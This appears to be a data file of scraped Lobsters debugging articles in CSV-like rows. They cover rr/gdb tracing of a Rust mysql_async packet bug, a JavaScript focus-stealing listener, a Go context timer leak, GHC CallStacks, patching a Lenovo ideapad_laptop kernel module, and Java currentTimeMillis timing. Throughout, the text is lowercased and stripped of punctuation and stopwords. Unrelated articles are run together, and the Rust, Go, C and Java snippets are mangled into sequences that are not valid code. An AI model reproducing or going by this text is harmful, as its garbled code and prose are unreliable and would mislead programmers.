mov rbp mov rbp mov rbx rbp mov rbp rax mov rax rbp mov rbp rax mov rax rbp movdqa rbp movdqa rbp mov rbp lea rip rax source newpacket parseresult incomplete mut newpacket needed debug data need byte needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpush byte cool rr move forward backwards running program whim gdb provides reverse command continue next nextinstruction step stepinstruction reversecontinue rc reversenext rn reversenextinstruction rni reversestep r reversestepinstruction rsi hmmm program counter pc jumped backward quite instruction line know first value needed might able read register stack location assembly correlate first value according packet capture first mysql packet received packet length number common trust luck would kmc rust irc channel informed test blackbox var nice bit rust black magic prevents optimizer touching var expression inside setup necessary use must use nightly toolchain import test crate mysqlasync already provides behind feature nightly option add use test top srciomodrs cfg feature nightly use test rebuild sscce cargo nightly build release rerun sscce rr record error manifest rr replay jump gdb adjust setting really see putting setup dot file something modifying srciomodrs pushed code breakpoint resides line remove debug statement error would reappear gdb breakpoint breakpoint file homeboxofroxfilesdevelopmentrustcratesmysqlasyncsrciomodrs line gdb continue continuing warning could load shared library symbol need set solibsearchpath set sysroot debug running breakpoint mysqlasync io poll let bufhandle selfbufasmut unwrap huh wonder stopped line breakpoint must stop line executes convenient want see effect line code much gdb reversenext test blackbox needed assembly mov rsp line mov rsp mov rsp mov rsp mov rsp rax mov rsp mov rsp rax mov rsp movdqa rsp movdqa rsp mov rsp lea rsp rax hold needed mov rsp test blackbox lea rsp rax rax never used mov test je mysqlasync io lea rax rax overwritten source parseresult incomplete mut newpacket needed test blackbox needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpush byte run gdb xgu rax gdb show unsigned value memory location needed rax wo nt help change line use rsp instead let set breakpoint bear going visit mistake someone may actually learn something example strike one gdb disable gdb breakpoint rsp note breakpoint disabled also set pc breakpoint file homeboxofroxfilesdevelopmentrustcratesmysqlasyncsrciomodrs line gdb continue continuing error testing breakpoint condition attempt dereference generic pointer breakpoint mysqlasync io poll let bufhandle selfbufasmut unwrap attempt dereference generic pointer hmmm guess need cast let fall back old c programming day make happen strike two get rid invalid breakpiong gdb delete gdb break unsigned long rsp syntax error expression near long rsp wait gdb recognize c syntax mileage vary asked rust archliux gdb rr syntax worked others ultimately nt work gdb parse many language know working rust source code rust syntax casting work home run gdb breakpoint rsp usize note breakpoints disabled also set pc breakpoint file homeboxofroxfilesdevelopmentrustcratesmysqlasyncsrciomodrs line gdb continue continuing breakpoint mysqlasync io poll let bufhandle selfbufasmut unwrap gdb xgu rsp memory rsp loaded value could avoided issue casting using felt stack memory would le transient register reliable program stopped look like needed seems bit high compared number looked sure nt make mistake stumble upon garbage value let enable breakpoint stop line previous execution reasonable value indeed found needed gdb enable gdb reversecontinue continuing breakpoint mysqlasync io poll let bufhandle selfbufasmut unwrap gdb xgu rsp reasonable look like arrived correct position program reversed couple time found expected continued forward breakpoint needed want step program par bad packet start code relevant code entirety note srciomodrs fn poll mut self poll option packet error read everything selfendpoint let mut wouldblock false selfclosed let mut buf read many byte possible network socket loop match selfendpointasmut unwrap read mut buf ok nothing read break ok size byte read put longterm storage relative lifetime local variable buffer let bufhandle selfbufasmut unwrap bufhandleextend buf size err ref e ekind io errorkind wouldblock nothing read let program keep running instead blocking yay async wouldblock true break err error selfclosed true return err error error else return ok ready none need call data selfbuf data written packet parser let mut shouldpoll false regardless whether byte read network always try move parsing may byte longterm storage left use pick parsing left last time establishes state machine parsing interrupted lack data network let nextpacket selfnextpackettake expect streamnextpacket none either finish packet copy byte longterm storage nextpacket let nextpacket match nextpacket parseresult done packet seqid packet complete set parse next packet returning completed packet selfnextpacket newpacket empty parse return ok ready packet seqid parseresult needheader mut newpacket needed parsing header progress needed tell u many byte needed finish header never much header four byte size let bufhandle selfbufasmut unwrap let buflen bufhandlelen copy needed byte longterm storage available supply short byte bufhandledrain cmp min needed buflen newpacketpushheader byte buflen plan recurse poll byte longterm storage shouldpoll true newpacket parseresult incomplete mut newpacket needed collecting data determined length field header needed tell u many byte needed test blackbox needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpush byte buflen plan recurse poll byte longterm storage shouldpoll true newpacket regardless whether byte copied nextpacket try parse byte copied arrange next loop iteration pick leaf parse source code provided selfnextpacket nextpacketparse recurse planned possibility read byte network socket shouldpoll wouldblock selfpoll else ok notready srcprotors derive debug pub struct newpacket data vec length usize header vec lastseqid impl newpacket pub fn parse mut self parseresult idea data exists maxpayloadlen discarded let lastpacketpart selfdatalen consts maxpayloadlen lastpacketpart data exists run parsing checklist byte header selfheaderlen let needed selfheaderlen plan parse header byte available return parseresult needheader self needed else byte header arrived decompose packet length sequence id let length selfheader unwrap selflastseqid selfheader debug last seq id selflastseqid selfheaderclear length plan complete packet next iteration return parseresult done packet payload selfdata selflastseqid else selflength length usize plan read byte data next iteration return parseresult incomplete self length usize else fast path waiting data byte arrive lastpacketpart selflength return parseresult done packet payload selfdata selflastseqid else let length selflength return parseresult incomplete self length lastpacketpart plan jump forward broken packet start getting parsed jump backward top poll function observe many byte going longterm storage selfbuf observe many byte available selfbuf reading network stop observe many byte copied nextpacket maybe also verify byte read selfbuf written nextpacket instead garbage observe behavior result nextpacketparse repeat anomaly found first two step simple enough gdb breakpoint breakpoint file homeboxofroxfilesdevelopmentrustcratesmysqlasyncsrciomodrs line gdb continue continuing breakpoint mysqlasync io poll let bufhandle selfbufasmut unwrap gdb breakpoint breakpoint file homeboxofroxfilesdevelopmentrustcratesmysqlasyncsrciomodrs line gdb reversecontinue continuing breakpoint mysqlasync io poll selfclosed remaining step require quite bit work variable optimized away complex type ie structs rust rfc intentionally leaf memory layout unspecified structs enums optimization rust reorder optimization went live spent quite bit time trying figure identity memory layout compiler used turn rustc z printtypesizes print memory layout well size quite bit information sift ran following dump information relevant sscce file could search rustflags z printtypesizes cargo nightly build release tmpboxofroxtypesizestxt also turn memory layout useful struct kept memory like unoptimized variable nt case llvm tear structs apart optimize field individually great performance great debugging one situation test blackbox would work nt pushing limit first use add error longer occurs stack offset eg rsp seem vary wildly build build ca nt move test blackbox around identify field time adopted another technique would call chokepoint method basically paw code looking simple expression use assign variable interested cross finger pray expression nt optimized away rvalue assignment viable choke point backtracking code compiler nt care value stored stack earlier may assign value new stack location finding rvalue assignment instruction interest may present wrong stack location apply method recall wanted observe number byte selfbuf step plan first characterize variable type know part looking selfbuf std collection vecdeque composed type digging rust source bit break tail usize vecdeque head usize ptr unique pointer nonzero const buf rawvec cap usize alloc heap simply tail usize vecdeque head usize ptr cap usize snippet line look like would simplify one two instruction provide starting address selfbuf bufhandle temporary variable optimized away line reference two variable nt know exactly assembly opcodes pertain variable instead tried drilling call vecdeque extend since receives selfbuf interacts vecdeque data let bufhandle selfbufasmut unwrap bufhandleextend buf size eventually ran private function vecdeque isfull assembly mov rdx mov rbx mov rdx rax sub rax lea rbx rcx rax rcx mov rbx rax sub rcx rax cmp rax source return true buffer full capacity inline fn isfull self bool selfcap selflen stable feature since pub fn len self usize count selftail selfhead selfcap register rax rbx rcx rdx rsi rdi rbp rsp rip eflags pf zf according assembly rax rcx equivalent selfcap selflen tracing backward found hold selfcap address selflen computed selfhead selftail correlate assembly look hexdump byte address find layout similar vecdeque characterization created earlier memory tail head ax ptr cap point nt sure found ptr since code process extending empty head tail vecdeque byte watch byte see fill byte step rest process also noted ptr subject change buffer grows whenever wanted watch memory selfbuf keep track ptr changed method hand ran plan paraphrasing line code story made sense glitch occurred story anomaly machine time application flake mysqlasync library read last four byte retrieved tokiocore net tcpstream empty intermediate data structure mysqlasync proto newpacket called newpacket used parse one mysql packet byte become available last four byte header next mysql packet parse copied newpacketheader std vec vec assertion newpacketheaderlen decomposed sequence id unsigned length mysql header read length indicates byte data needed complete packet since byte process another attempt read tcpstream commences fails err wouldblock point mysqlasync library schedule future read try reparse newpacket one time case byte read newpacketparse function srcprotors line state machine transitioner check current state return value schedule next byte read tcpstream shall go put newpacket program already pulled four byte header buffer empty byte point parse function check see header byte register represents newpacketheaderlen contains instead code erroneously return parseresult needheader instead parseresult incompletedata corrupts reading tcpstream anomaly found damn program run fast trigger fix found time got far spent hour three week digging program burnt could nt see forest tree could spend hour working backwards anomaly trying understand register newpacketheaderlen reset zero inejge pointed culprit saved day turn line srcprotors clearing content newpacketheader vector srcprotors debug last seq id selflastseqid selfheaderclear length oh let count number time looked line code stepped program teasing stack location optimized variable mind register line even existed submitted pull request remove line accepted mysqlasync run better lesson learned wisdom attention detail key analyze different perspective correlate result verify conclusion accurate never underestimate utility second third pair eye always question assumption sometimes think got right wrong keep anger frustration check asking assistance negative tone le inviting volunteer easy misdirect anger person trying help volunteer neither want deserve make effort least keep neutral tone ca nt share rr trace others tied directly hardware o due syscall recording effort underway lift limitation though programming rust nt mean code wo nt suffer wierd behavior conclusion bug great opportunity learn grittier side debugging unfortunate aspect stumbling thing nt know huge time sink could barely afford next time run similar problem better equipped handle case many thanks inejge marksimulacrum assistance troubleshooting bug offered inejge tip cup coffee finding solution instead asked write blog post thank thanks also go rust devs community tokio devs especially blackbeam work maintaining mysqlasync
410,Lobsters,debugging,Debugging,Finding that pesky listener that’s hijacking your event,https://medium.com/@azizhk/finding-that-pesky-listener-thats-hijacking-your-event-javascript-b590593f2a83,finding pesky listener hijacking event,finding pesky listener hijacking event javascript problem jquery using chrome devtools find dom modification chrome list dom event listener particular event tell u better enter timeline tab key pressed something modalcontainer focused snatch back pranav gupta wrong take away chrome devtools timeline start recording,finding pesky listener hijacking event javascript debugging story determine event listener calling eventpreventdefault eventstoppropagation completely random thing allowing intended actionthe problemwe form clicked input box would focus clearly something listening either focus input box listening blur something else would try give focus input box hidden screennow huge code lot spaghetti code tapped somehow work react backbone jquery underscore close finishing migration difficult find causing event listener added many place track many areusing chrome devtools find dom modificationsto find something modifying dom easy chrome devtools select element element pane right click select break subtree modification attribute modification node removalbut current problem dom modified would help herelist dom event listener particular eventthere event listener tab beside style element panel chrome devtools list event event listener added event ancestor current dom element selected element pane sound like tongue twister option remove listener go listener function definition using framework like jquery react take internal function going helpso thought let remove listener might get lucky removed listener focus blur click etc seeing one another one hindering u ala removed listener event ancestor still able focus input boxwhat tell u tell u one thing listener listening focus click event listening blur event element disjoint tree element search blur blur onblur repository found instance crap going take long colleague started adding debugger statement everywherenow add event listener window focus capture phase find culprit dom steal focus give u culprit function set focus would need additional step find thatcan better enter timelineyou record flamegraph everything happens browser script rendering timeline panel started recording clicked input box stopped voila found event listenerclick name take definition source panel looking pretranspiled code found author left commentparent addeventlistener blur function e erelatedtarget return tab key pressed something modalcontainer focused snatch back find erelatedtarget length return thisfocus true something else focused snatch back piece code like code added modal library code someone click tab shift tab input box behind backdrop modal cursor might move added overflow hidden body input box bottom screen browser might scroll user might see backdropso pretty neat piece code kudos pranav gupta adding itso wrong mentioned migrating codebase backbone react done opened react modal modal written using react top backbone modal made two different container one backbone modal one react modal losing focus active modal caused issue little condition added fixed thistake away chrome devtools timelinewell might difficult bug time using timeline effective tool finding exactly happening slow fast operation easily used find performance degradation start recordingdo think better way debug obvious way write better code mention comment learnt something new recommend story
411,Lobsters,debugging,Debugging,"The Tale of a Go Resource Leak, Square Engineering",https://medium.com/square-corner-blog/always-be-closing-3d5fda0e00da,tale go resource leak square engineering,always closing tale go resource leak http developersquareupcomblog root cause lesson learned context go context quick primer timerafterfunc timer timer stop contextgo runtimetimego lesson learned always rollback possible gap go tooling made investigating difficult pprof investigation step looking correlating change step digging gc log gogc step profiling heap pprof http step heap dump analysis eclipse memory analyzer debugwriteheapdump incomplete documentation request related discussion patch step lost step experimenting finalizers runtimesetfinalizer putting together looking back,always closing tale go resource leakheads moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogthis story resource leak one square go service process uncovering root cause facing spiky mysterious system metric used variety standard homemade tool uncover subtle bug one core internal frameworksearlier year one go service began using significantly memory breaking steady state flat memory use predictable garbage collection pattern time cpu use rose well particular service generally used around mb memory figure soon grew several gbafter much investigation turned substantial number request combination bug causing service retain perrequest metadata almost hour instead millisecond ultimately two root cause tickled seemingly benign configuration bug another service one service affected many go service potentially susceptible bugthis post first explains bug encountered recount various step took investigate fruitful othersroot cause lesson learnedultimately root cause due incorrect us go context type square custom framework handling incoming request dispatching handler function framework code creating context deadline request completed canceling context release related resource resulted lifetime context object heap exceeding related requestthis root cause tickled configuration change another service inadvertently set client request timeout second instead intended millisecond client misconfiguration led request context retained buggy server second hour instead millisecondsgo context quick primerin go context interface used general way passing around immutable metadata single request operationa context created keyvalue pair wrapped another context add override data outerwrappingchild context access wrappedparent context data vice versahere quick example context created rootctx contextbackground return singleton child rootctxa contextwithvalue rootctx location san francisco b child ab contextwithvalue weather foggy c also child unrelated bc contextwithvalue weather cloudy child c override c weather valued contextwithvalue c weather sunny fmtprintf location v weather vn avalue location avalue weather fmtprintf location v weather vn bvalue location bvalue weather fmtprintf location v weather vn cvalue location cvalue weather fmtprintf location v weather vn dvalue location dvalue weather output locationsan francisco weather nil locationsan francisco weatherfoggylocationsan francisco weathercloudylocationsan francisco weathersunnythe relationship context example look like context point parent inheriting overriding valuesin addition storing keyvalue data context may also created associated wallclock deadline context deadline created register callback function mark context canceled deadline pass callback function scheduled go runtime internals contextwithtimeout schedule timer cancel context deadline ctx second current wall clock timectx cancelctx contextwithtimeout contextbackground timesecond defer cancelctx amount time pass ctxerr nil fmtprintln context done yet work else context either timed cancelctx called fmtprintln context done skipping work critically timer callback function keep reference context canceled application code explicitly cancel context runtime timer remains set context remains memory timer firesthis core issue framework code explicitly canceling context creating passing handler codeto illustrate framework code essentially func server handlerequest req request conn connection create context deadline hour future ctx contextwithtimeout contextbackground timehour attach metadata ctx using helper function ctx scontextwithmetadata ctx req deserialize request delegate handler reqproto deserialize req respproto err scallhandler ctx reqproto err nil connwriteerror err else connwriteresponse respproto even though method return quickly ctx retained memory hour since pending deadline timer hold reference timer fire ctx garbage collected correct way use context always cancel related operation request handler case completes rule thumb code creates new context ensure canceledgiven buggy snippet actual code fix simple func server handlerequest req request conn connection create context deadline hour future ctx cancelctx contextwithtimeout contextbackground timehour use defer case panic returning early defer cancelctx rest method right method return cancelctx called allowing ctx garbage collected bonus reading context implementation us timerafterfunc schedule deadline timer timer timer stop method cleanup timer context canceled take peek contextgo source code see timer created usedinternally go runtime us heap manage outstanding timer see runtimetimego source code implementationlessons learnedalways rollback possible le lesson learned maxim ignored started investigating issue one first thing look change happening around time performance degraded interesting change occurred within day change client timeout configuration good correlation term timing despite several engineer reviewing configuration change part initial review investigation everyone dismissed irrelevant bumping timeout little bit big deal given close timing change incident well low cost rolling back client configuration change immediately rolled back timeout change would fixed root cause would helped pinpoint investigate furthergaps go tooling made investigating difficult debugging issue hampered notable gap go tooling would faced code running jvm sign pointed issue fairly classic memory leak go really tooling dump analyze heap pprof tool useful find memory issue give useful hint case limited give statistic object allocated retaining themthe investigationthe remainder post go investigation roughly chronological order commentary around observation hindsight wrong misleadingthe general progression went followslook correlating code environment change affected system related system hardwaredig gc logsprofile heap using pprofattempt deeper heap analysis using runtime heap dump method homegrown toolsexperiment different patch canary host using runtime gc hook narrow object retainedfix fourth fifth step required hacking ultimately fruitfulstep looking correlating changesfirst made list observed change sudden climb memory use mb gbmemory use climbed consistently seemed plateau process running memory killed o hindsight make lot sense since leaked object eventually gced context cleanup timer fired hourspreviously predictable gc run rate dropped significantlyconsistently higher cpu usagewe also made list change spike request servicethere recent deploys serviceno correlating deploys service dependenciesno correlating deploys calling service observation incorrect client timeout change ended correlatingstep digging gc logssince saw alarming gc pattern decided start looking gc log find odd behavior main takeaway reading log despite heap continually growing garbage collection taking outsize amount time gc run short released small amount memoryaside step useful exercise better understanding go gc log format let take look snippet encountered gc forcedgc m clock m cpu mb mb goal phere interpret component first gc garbage collection since process process running second roughly process total time spent m clock m cpu time spend three gc phase stoptheworld sweep concurrent mark scan stoptheworld mark mb heap size gc gc live heap size go overallocates heap case mb allocated mb heap used go mb goal heap size garbage collector start next run determined heap size current gc run gogc environment variable default value represents ratio newly allocated data existing data since last gc calculation behind goal case mb mb gogc number processor used garbage collectorthere also additional log garbage collector scavenger mb inuse idle sys released consumed mb scavenger release unused memory back system truly freeing memorylet interpret scavenger mb released memory returned systeminuse go allocated mb memory heap may include unused memory dead objectsidle mb memory used contain reachable object longer doessys mb requested osreleased mb memory released back osconsumed mb allocated go osstep profiling heap pprofwith evidence memory leak decided use pprof narrow code leaking memory pprof standard go tool dumping exploring visualizing statistic memory cpu use go apps pprof either analyze single dump diff two different dump latter useful finding change application running steady stateour go application internal http endpoint retrieve data pprof used get dump running process curl sk http heapoutonce dump able use pprof show method allocating data one command ran display function allocating unreleased memory pprof take binary app servicebinary case dump heapout argumentsgo tool pprof runtime inusespace servicebinary heapout pprof total dropped node cum showing top node cum flat flat sum cum cum squareupsakeserver server squareupvendorstashcorpsquareupcomgoprotobufgitproto buffer contextwithvalueeach line indicates much memory used object created inside specific function important note though indicates object created still retaining reference themlooking closer method handle incoming request responsible lot retained object least squareupsakeserver server handlerequestthis line indicates handlerequest created mb heap object still reachable furthermore handlerequest plus method reachable holding gb object normal state number would dozen mb mostwhen first saw data correctly assumed request handling code leaking object also noticed despite lot context object retained request message retained however still understand root cause point hindsight could also noted mb memory allocated inside timeafterfunc unusual explored furtherstep heap dump analysisat point decided go beaten pathwhile pprof gave u hint request context data leaking pinpoint cause leak holding many language tool dump application heap analyze traverse object graph java app would happily fired eclipse memory analyzer example unfortunately go one languagesrich heap dump support incredibly useful make much easier find object garbage collected traversing path retained object root object case wanted find data structure holding ton requestrelated data suspect real heap analyzer tool would drastically cut time took u debugwhile go support exploring heap unofficial method runtimedebug package generating something approximately like heap dump debugwriteheapdump function output lowlevel heap state running process binary format golang wiki incomplete documentation format ended read writeheapdump source code order understand itthere enormous downside output writeheapdump essentially dump raw byte object along bit set indicating word within byte represent pointer object omits data type including type nametraversing object graph without type tedious best impossible case found finding obvious string working backwards referring object way infer object type even required knowing go represents core data structure like slice map memoryaside go maintainer involved discussion around building proper support heap analysis hopefully tooling better somewhat soon request related discussion contexthere dumped object look like field line represents word memory link object word represents pointera visual representation heap dump object courtesy represents struct specific protocol buffer message determining chorethe image open source project written circa go older go runtimes included detailed type information heap amount available metadata reduced runtime evolved newer version go decided try use tool better understand heap object graph getting running required applying patch tool source writing additional patch ownafter traversing graph viewed determined object image instance type look like type someprotomessage struct firstfield string somebytes byte xxxunrecognized byte image name type number randomly chosen tool unique type ppssp indicates type word object pointer pointer scalar scalar pointer per image object word field row represents word suggested ppssp unclear name formed dumped type word instead expected one pointer two slice failed tangent tried write tool traverse type reachable entry point app type print type signature unable successfully reasonable amount time abandoned effort bright side learned bit use standard library inspect go program source various phase parsingstep lostwhile traversing heap ultimately failure effort total bust noticed string heap useful hint type retained especially useful case since request server contain lot stringswith mind wrote simple tool extract count common string heap also count string distinct format square rpc framework us represent request idsthe following sample output indicates much retained data related request single service one misconfigured timeoutthe first line output show count request id heap indicating many request related data still memorythe remaining line first output count p count string encoded protocol buffer message finally string surrounded backticks example p applicationxprotobuf mean protocol buffer string applicationxprotobuf appears heap time request unique string id uniform format following count show lot request id string heaprequest id count format following line count p protocol buffer string string heap p applicationxprotobuf although service many different caller name service misconfigured timeout show themisconfiguredcallingservice p contentlength p accept bad timeout value included p p xrequestdeadline hindsight really rolled back offending calling service point unfortunately notstep experimenting finalizersat point mystery intent solving request specific service causing leak used hacky go runtime trick help finally figured outto determine characteristic specific object retained turned go runtimesetfinalizer function function instructs go runtime execute callback immediately prior garbage collecting object setting callback easy although would recommend using real production code heapobject new string runtimesetfinalizer heapobject func theobject string heapobjecttheobject garbage collected fmtprintln bye setfinalizer mind set finalizers small set type server occasionally log count type created garbage collected code track context looked roughly like var contextnumber contextsoutstanding func requesthandler ctx contexthelpernewcontext timeout help debug use counter link allocation finalizer log message ctxnumber contextnumber keep count reachable context object ctxoutstanding contextsoutstanding gloginfof gcinvestigation actionalloc typecontext id outstanding ctxnumber ctxoutstanding runtimesetfinalizer ctx func r contextcontext ctxoutstanding contextsoutstanding gloginfof gcinvestigation actionfinalize typecontext id outstanding ctxnumber ctxoutstanding output logging unambiguously showed somecontexts gced request object count outstanding context kept rising snippet context allocated life process remained info gcinvestigation actionfinalize typecontext togetherby point knew context leaking context created reread context documentation scanned source code get better understanding implemented led u seeing use timeafterfunc interacts runtime formed hypothesis timer callback leaking soon confirmed thorough reading source code server frameworkin end fix incredibly simple change request handler framework code beforefunc requesthandler ctx contexthelpernewcontext timeout afterfunc requesthandler ctx cancelctx contexthelpernewcontext timeout defer cancelctx oops fixed issue witnessed misbehaving service since framework shared internal go apps fix guard misbehaving client welllooking backlooking back whole ordeal reiterated importance key engineering practicesone go convention around ignoring returned error cleanup function exist good reason casually ignored original framework code ignored cancelfunc associated context given context documentation clearly state release resource would argue code swallowing cleanup error return value exceptional clearly documented rationaleanother practice hesitate roll back code closely correlate issue related system cost low may yield benefit helping narrow trigger bug particular case would saved significant time debuggingfinally debugging travail aside enjoyed learning various part go internals tooling ecosystem around
412,Lobsters,debugging,Debugging,Using GHC CallStacks,http://www.parsonsmatt.org/2017/07/29/using_ghc_callstacks.html,using ghc callstacks,using ghc callstacks github repository shallow stack omitting callstack include hascallstack constraint implicit parameter,using ghc callstacks jul note blog post code accessible github repository follow along like haskell really callstack evaluation strategy like graph reduction understand okay either know make question like stack trace error surprisingly difficult answer haskell debugging story tends rather nice break code small composable reusable function take advantage type make error unrepresentable practical write unit property test rest also great know error actually come coding practice like ever use partial function like head prefer nonempty possible help lot however may find stuck staring similar frankly suck ghccallstack ghc callstack simulation mechanism interface nullary type class include callstack program adding headnocallstack headnocallstack x x x headnocallstack error nope headwithcallstack hascallstack headwithcallstack x x x headwithcallstack error nope let compare behavior various function ordinary head prelude give u λ head exception preludehead empty list well useless information even called headnocallstack give slightly better result λ headnocallstack exception nope callstack hascallstack error called main lib get callstack error modified recently carry callstack parameter though information little hidden λ error error char λ error error forall r ghctypesruntimerep type r hascallstack char defined ghcerr info output show error polymorphic runtime representation eg phantom type unlifted type like int lifted type like int type omits hascallstack constraint reason headwithcallstack throw error get extra information λ headwithcallstack exception nope callstack hascallstack error called main lib headwithcallstack called interactive interactive construct callstack headwithcallstack error call nice shallow stack interact complex program let write something bit nesting maximumcs hascallstack ord maximumcs max hascallstack x x k x x k x k x error empty list someprogram hascallstack int int someprogram headwithcallstack maximumcs nothing terribly complicated propagating callstack way let see happens blow λ someprogram exception empty list callstack hascallstack error called main lib called main lib maximumcs called main lib someprogram called interactive interactive λ someprogram exception nope callstack hascallstack error called main lib headwithcallstack called main lib someprogram called interactive interactive nice get complete stack trace everything went wrong pas empty list see error called called maximumcs finally someprogram main offender given see headwithcallstack one threw exception nice omitting callstack let see work omit something point foo hascallstack maybe foo foo nothing error foo unpleased bar maybe bar foo baz hascallstack maybe baz bar fromjust disguise baz delegate bar bar delegate foo let observe stack trace get call baz nothing λ foo nothing exception foo unpleased callstack hascallstack error called main lib foo called interactive interactive λ bar nothing exception foo unpleased callstack hascallstack error called main lib foo called main lib λ baz nothing exception foo unpleased callstack hascallstack error called main lib foo called main lib callstack appears cut get see happens foo local stack since bar hascallstack constraint propagate information error bubbled function chain hascallstack signature nothing represented stack trace pretty big limitation include hascallstack constraint great question hascallstack implemented type hascallstack callstack callstack mean implicit parameter current version ghc extra parameter get passed around handled program affect performance implicit parameter potentially interact sharing weird way might also cause strange performance issue hascallstack pervasive many library unlikely actually callstack present function pas library framework code make le useful lastly ghc exception machinery notion callstack proper exception throw catch callstack error call
413,Lobsters,debugging,Debugging,Patching a Linux Kernel Module,https://intoli.com/blog/patching-a-linux-kernel-module/,patching linux kernel module,bug linux never antergos getting bottom predistable network interface name patching kernel module issue kernelorg patch wrapup get touch,bug linux never using gnulinux fifteen year got admit used pretty rough around edge put lightly lot change fifteen year though thing major problem area required second thought year laptop suspension wifi advanced function key sound pretty much everything else typically work day case quite ah anecdote might say honestly closer statistic point often suggest people thinking buying new computer try breathing new life old one first putting gnulinux spec improved enough recently make huge difference people experience software bloat usually bigger problem hardware limitation somebody interested giving shot always happy help get situated done quite number friend family member excellent result one family member father happily running ubuntu year old lenovo ideapad year browser steadily increasing memory usage time though ram starting feel bit tight even casual web browsing help alleviate upgraded solid state drive previous weekend also wanted try something bit lighter unity decided move antergos become goto nontechnical user want light stable operating system popped new hardware ran cnchi installer process antergos rebooted machine honestly bit stunned found able activate wifi started debugging problem quickly found actually kind interesting going solution ultimately ended involving patching kernel took fun detective work track issue main reason decided write find google handful forum post well ultimately probably dwindlingly small number people using ancient lenovo ideapad point anybody find search hopefully help resolve problem reason interesting glimpse open source software give power change thing work pretty much every level frustrating wifi bug o x took year get resolved would loved opportunity fix time even desperately trying get gnulinux working lenovo ideapad might still enjoy following along process debugging patching kernel issue getting bottom first thought might issue gui network manager hopped terminal tried bring interface directly first used ip link command find name wifi interface command list available interface roughly equivalent running ifconfig familiar older tool common lo loopback lowerup mtu qdisc noqueue state unknown mode default group default qlen linkloopback brd nocarrier broadcast multicast mtu qdisc fqcodel state mode default group default qlen linkether de brd ff ff ff ff ff ff broadcast multicast mtu qdisc mq state mode dormant group default qlen linkether ac brd ff ff ff ff ff ff see interface name wl prefix denotes wirelesslan interface might used seeing interface name like name phased systemdbased system favor predistable network interface name stable across reboots hardware change knowing interface identifier tried bring sudo ip link set equivalent sudo ifconfig operation failed helpful error message rtnetlink answer operation possible due rfkill error message basically mean wifi card appears deliberately disabled like would expect put laptop airplane mode able determine seemed hardware switch causing problem listing detailed rfkill status rfkill list wireless lan soft blocked hard blocked yes using shortcut toggle wifi state appeared modify software block value actual hardware switch effect either state unblocking using sudo rfkill unblock also effect expected able modify software blocking state seemed hardware switch read correctly preventing system bringing interface patching kernel module mentioned helpful forum reply relating related symptom also observed earlier lenovo yoga laptop issue hardware switch driver still attempting read easy fix simply blacklist ideapadlaptop kernel module prevented keyboard working instead opted patch module disable support hardware switch entirely credit similar thing yoga laptop wifi actually work liveusb able boot access internet could use chroot effectively drop installation hard drive requires first mounting drive sudo mkdir mntantergos sudo mount mntantergos need replaced actual installation location check sudo fdisk l using arch archbased operating system liveusb simply run archchroot mntantergos distribution need step manually like everything root sudo su cd mntantergos mount temporary api filesystems mount proc proc proc mount rbind sys sys mount rbind dev dev mount rbind run run copy dns detail cp etcresolvconf etcresolvconf actually change root chroot mntantergos binbash source local bash configuration source etcprofile source bashrc point shell effectively act logged hard drive installation first let make sure longterm support kernel header installed pacman linuxlts linuxltsheaders take note kernel version installs case run l usrlibmodules find location corresponding kernel module want pick one corresponds lts kernel version move actually patching building required kernel module first make sure also build environment available running pacman basedevel simply run following sequence command note working different kernel version need find correct tarball location kernelorg modify usrlibmodule path accordingly drop nonroot user su l sangaline make working directory move mkdir kernelbuild cd kernelbuild download extract kernel source code wget http tar xvjf clean source tree cd make clean make mrproper copy existing configuration cp cp prepare source tree make prepare make script prepared build kernel module first must patch disable hardware wifi switch force perceived state patched change follows include linuxdeviceh include acpivideoh define ideapadrfkilldevnum define cfgbtbit define include linuxdeviceh include acpivideoh define ideapadrfkilldevnum define cfgbtbit define seqprintf bl power value sn value seqprintf n readecdata priv adev handle vpccmdrrf value seqprintf radio status lu n value value readecdata priv adev handle vpccmdrwifi value seqprintf wifi status lu n value value static const struct ideapadrfkdata ideapadrfkdata ideapadwlan cfgwifibit vpccmdwwifi rfkilltypewlan ideapadbluetooth cfgbtbit vpccmdwbt rfkilltypebluetooth rfkilltypewwan static void ideapadsyncrfkstate struct ideapadprivate priv unsigned long hwblocked int priv hashwrfkillswitch readecdata priv adev handle vpccmdrrf hwblocked return hwblocked hwblocked ideapadrfkilldevnum priv rfk rfkillsethwstate priv rfk hwblocked static int ideapadregisterrfkill struct ideapadprivate priv int dev ideapadregisterrfkill priv ideapadsyncrfkstate priv writeeccmd priv adev handle vpccmdwwifi ideapadsynctouchpadstate priv acpivideogetbacklighttype acpibacklightvendor either apply change manually download apply patch directly site download contextual patch intolicom wget http intolicomblogpatchingalinuxkernelmoduleideapadlaptoppatch apply source tree patch ideapadlaptoppatch everything set go finally compile ideapadlaptop kernel module make overwrite existing module new patched one mindful etclibmodules path use gzip gzip sudo cp point might want doublecheck systemdboot config make sure default correct kernel version used systemdboot simply modify default antegros line bootloaderloaderconf instead read default antegroslts one last thing probably lock kernel version prepared update module want update kernel done simply adding following line etcpacmanconf ignorepkg linuxlts linuxltsheaders wrapup found google dealing rfkill hardware switch issue lenovo ideapad hopefully found helped solve problem otherwise maybe least able find interesting see go debugging solving kernellevel issue gnulinux admittedly bit headache figure really enjoy fact thing unfixable problem open source software please get touch ever dealing devops debugging issue looking outside assistance
414,Lobsters,debugging,Debugging,The slow currentTimeMillis(),http://pzemtsov.github.io/2017/07/23/the-slow-currenttimemillis.html,slow currenttimemillis,java measuring speed window version openjdk distribution java linux version virtual dynamic shared object source code version linux kernel high precision event timer coarse timer tsc time source jvm java java multithreaded performance java c offtopic system call java conclusion java update nanotime reddit java java java conclusion update java reddit,today look one basic often used method java library systemcurrenttimemillis method report current time millisecond accuracy one may think performance method irrelevant care obtaining current time take m measured interval millisecond long however case might still want invoke method frequently example detecting reporting abnormally long execution time instance measure time take execute http request case hope take one millisecond report zero use method want alarmed measured time abnormally long eg exceeds m case time every request may hundred thousand even million per second obtaining timestamps associated object instance cached data arrange timebased eviction cache measuring duration long frequently initiated asynchronous process request remote server timestamping realworld event instance trading system may wish record timestamps incoming order performed deal short despite rather low accuracy method case called often valid question arises performance method measuring speed way test performance currenttimemillis straightforward call many time making sure optimised altogether static void testmillispeed long sum int n long systemcurrenttimemillis int n sum systemcurrenttimemillis long 